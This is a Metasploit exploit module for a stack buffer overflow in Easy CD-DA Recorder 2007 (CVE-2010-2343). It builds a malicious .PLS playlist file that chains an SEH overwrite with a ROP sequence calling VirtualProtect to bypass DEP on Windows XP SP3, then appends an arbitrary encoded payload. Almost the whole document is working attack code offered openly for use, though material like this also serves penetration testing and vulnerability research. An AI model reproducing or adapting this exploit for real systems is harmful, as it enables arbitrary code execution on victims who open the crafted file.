##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Easy CD-DA Recorder 2007 PLS Buffer Overflow',
      'Description'    => %q{
        This module exploits a stack-based buffer overflow vulnerability in
        Easy CD-DA Recorder 2007, caused by a long string in a playlist entry.

        By persuading the victim to open a specially-crafted .PLS file, a
        remote attacker could execute arbitrary code on the system or cause
        the application to crash.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'chap0',       # Vulnerability discovery and original exploit
          'Gabor Seljan' # Metasploit module
        ],
      'References'     =>
        [
          [ 'BID', '40631' ],
          [ 'EDB', '13761' ],
          [ 'OSVDB', '65256' ],
          [ 'CVE', '2010-2343' ],
          [ 'URL', 'http://www.corelan.be:8800/advisories.php?id=CORELAN-10-048' ]
        ],
      'DefaultOptions' =>
        {
          'ExitFunction' => 'process'
        },
      'Platform'       => 'win',
      'Payload'        =>
        {
          'BadChars' => "\x0a\x3d",
          'Space'    => 2559
        },
      'Targets'        =>
        [
          [ 'Windows XP SP3 (DEP Bypass)',
            {
              'Offset' => 1108,
              'Ret'    => 0x1001b19b  # ADD ESP,0C10 # RETN 0x04 [audconv.dll]
            }
          ],
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Jun 7 2010',
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('FILENAME', [ false, 'The file name.', 'msf.pls'])
        ],
      self.class)

  end

  def nops
    return make_nops(4).unpack("V").first
  end

  def exploit

    rop_nop =
    [
      0x1003d55d   # RETN (ROP NOP) [audconv.dll]
    ].flatten.pack('V*')

    # ROP chain generated by mona.py - See corelan.be
    rop_gadgets =
    [
      0x1007261e,  # POP EDX # RETN [audconv.dll]
      0x0042a0e0,  # &VirtualProtect() [IAT easycdda.exe]
      0x1003bd6b,  # MOV EAX,DWORD PTR DS:[EDX] # RETN [audconv.dll]
      0x10035802,  # XCHG EAX,ESI # RETN [audconv.dll]
      0x1005d288,  # POP EBP # RETN [audconv.dll]
      0x004030c8,  # &PUSH ESP # RET 0x08 [easycdda.exe]
      0x1005cc2d,  # POP EBX # RETN [audconv.dll]
      0x000009ff,  # 0x000009FF-> EBX
      0x1008740c,  # POP EDX # RETN [audconv.dll]
      0x00000040,  # 0x00000040-> EDX
      0x1001826d,  # POP ECX # RETN [audconv.dll]
      0x004364c6,  # &Writable location [easycdda.exe]
      0x00404aa9,  # POP EDI # RETN [easycdda.exe]
      0x100378e6,  # RETN (ROP NOP) [audconv.dll]
      0x0042527d,  # POP EAX # RETN [easycdda.exe]
      nops,
      0x00429692   # PUSHAD # INC EBX # ADD CL,CH # RETN [easycdda.exe]
    ].flatten.pack('V*')

    sploit =  rand_text_alpha_upper(target['Offset'])
    sploit << generate_seh_record(target.ret)
    sploit << rand_text_alpha_upper(80)
    sploit << rop_nop
    sploit << rand_text_alpha_upper(4)
    sploit << rop_gadgets
    sploit << make_nops(4)
    sploit << payload.encoded
    sploit << rand_text_alpha_upper(10000)

    # Create the file
    print_status("Creating '#{datastore['FILENAME']}' file ...")
    file_create(sploit)

  end
end

